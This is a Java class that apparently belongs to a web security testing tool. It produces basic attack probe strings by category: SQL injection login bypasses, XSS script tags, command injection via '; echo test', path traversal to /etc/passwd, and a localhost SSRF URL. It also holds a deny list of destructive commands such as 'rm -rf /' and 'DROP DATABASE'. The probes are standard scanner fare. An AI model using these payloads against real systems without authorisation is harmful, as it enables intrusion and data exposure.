package com.example.plgenn;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

public class PayloadGenerator {

    private Random random;
    private Map<String, List<String>> encodedTemplates;

    public PayloadGenerator() {
        this.random = new Random();
        this.encodedTemplates = initializeEncodedTemplates();
    }

    // Main method to generate payload
    public String generatePayload(String category,
                                  String target,
                                  String complexity,
                                  String description) {

        List<String> templates =
                encodedTemplates.getOrDefault(category, getDefaultTemplates());

        if (templates.isEmpty()) {
            return "No templates available for category: " + category;
        }

        String encodedPayload =
                templates.get(random.nextInt(templates.size()));

        String decodedPayload = decodePayload(encodedPayload);

        String result = decodedPayload.replace("{target}", target);

        if (description != null && !description.isEmpty()) {
            result += "\n// Description: " + description;
        }

        return result;
    }

    // Decode templates
    private String decodePayload(String encoded) {

        return encoded
                .replace("{SQL1}", "' OR '1'='1' --")
                .replace("{SQL2}", "admin' --")
                .replace("{SQL3}", "\" OR \"\"=\"\" --")

                .replace("{XSS1}", "<script>alert('Test')</script>")
                .replace("{XSS2}", "\"><img src=x onerror=console.log('test')>")

                .replace("{CMD1}", "; echo test")
                .replace("{CMD2}", "| ls -la")

                .replace("{HTTP1}",
                        "GET / HTTP/1.1\\r\\nHost: {target}\\r\\nUser-Agent: PlGenN\\r\\n\\r\\n")

                .replace("{HTTP2}",
                        "POST /login HTTP/1.1\\r\\nHost: {target}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nuser=test")

                .replace("{PATH1}", "../../../etc/passwd")
                .replace("{PATH2}", "..\\\\..\\\\..\\\\windows\\\\win.ini")

                .replace("{API1}", "{\"query\":\"test\"}")

                .replace("{SSRF1}", "http://localhost:8080")

                .replace("{XXE1}",
                        "<?xml version=\"1.0\"?><test>data</test>");
    }

    private Map<String, List<String>> initializeEncodedTemplates() {

        Map<String, List<String>> templates = new HashMap<>();

        // SQL Injection
        List<String> sqlTemplates = new ArrayList<>();
        sqlTemplates.add("{SQL1}");
        sqlTemplates.add("{SQL2}");
        sqlTemplates.add("{SQL3}");
        templates.put("SQL Injection", sqlTemplates);

        // XSS
        List<String> xssTemplates = new ArrayList<>();
        xssTemplates.add("{XSS1}");
        xssTemplates.add("{XSS2}");
        templates.put("XSS", xssTemplates);

        // Command Injection
        List<String> cmdTemplates = new ArrayList<>();
        cmdTemplates.add("{CMD1}");
        cmdTemplates.add("{CMD2}");
        templates.put("Command Injection", cmdTemplates);

        // HTTP Requests
        List<String> httpTemplates = new ArrayList<>();
        httpTemplates.add("{HTTP1}");
        httpTemplates.add("{HTTP2}");
        templates.put("HTTP Requests", httpTemplates);

        // Path Traversal
        List<String> pathTemplates = new ArrayList<>();
        pathTemplates.add("{PATH1}");
        pathTemplates.add("{PATH2}");
        templates.put("Path Traversal", pathTemplates);

        // API Fuzzing
        List<String> apiTemplates = new ArrayList<>();
        apiTemplates.add("{API1}");
        templates.put("API Fuzzing", apiTemplates);

        // SSRF
        List<String> ssrfTemplates = new ArrayList<>();
        ssrfTemplates.add("{SSRF1}");
        templates.put("SSRF", ssrfTemplates);

        // XXE
        List<String> xxeTemplates = new ArrayList<>();
        xxeTemplates.add("{XXE1}");
        templates.put("XXE", xxeTemplates);

        return templates;
    }

    private List<String> getDefaultTemplates() {
        List<String> defaults = new ArrayList<>();
        defaults.add("{HTTP1}");
        return defaults;
    }

    public List<String> getAvailableCategories() {
        return new ArrayList<>(encodedTemplates.keySet());
    }

    public String generateTestPayload(String target) {
        return "GET /test HTTP/1.1\\r\\nHost: " + target + "\\r\\n\\r\\n";
    }

    public boolean isValidTarget(String target) {

        if (target == null || target.trim().isEmpty()) {
            return false;
        }

        return target.matches("^https?://.+")
                || target.matches("^\\d{1,3}(\\.\\d{1,3}){3}$")
                || target.matches("^[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    }

    public boolean validatePayload(String payload, String category) {

        if (payload == null || payload.trim().isEmpty()) {
            return false;
        }

        String[] dangerousPatterns = {
                "rm -rf /",
                "format c:",
                "DROP DATABASE",
                "DELETE FROM users",
                "shutdown"
        };

        for (String pattern : dangerousPatterns) {
            if (payload.contains(pattern)) {
                return false;
            }
        }

        return true;
    }

    public List<String> generateMultiplePayloads(String category,
                                                 String target,
                                                 String complexity,
                                                 int count) {

        List<String> payloads = new ArrayList<>();

        for (int i = 0; i < count; i++) {
            payloads.add(generatePayload(
                    category,
                    target,
                    complexity,
                    "Batch " + (i + 1)));
        }

        return payloads;
    }

    public Map<String, Integer> getPayloadStats() {

        Map<String, Integer> stats = new HashMap<>();

        for (Map.Entry<String, List<String>> entry : encodedTemplates.entrySet()) {
            stats.put(entry.getKey(), entry.getValue().size());
        }

        return stats;
    }

    public String obfuscatePayload(String payload) {

        return payload
                .replace("'", "%27")
                .replace("\"", "%22")
                .replace(" ", "%20")
                .replace("<", "%3C")
                .replace(">", "%3E");
    }
}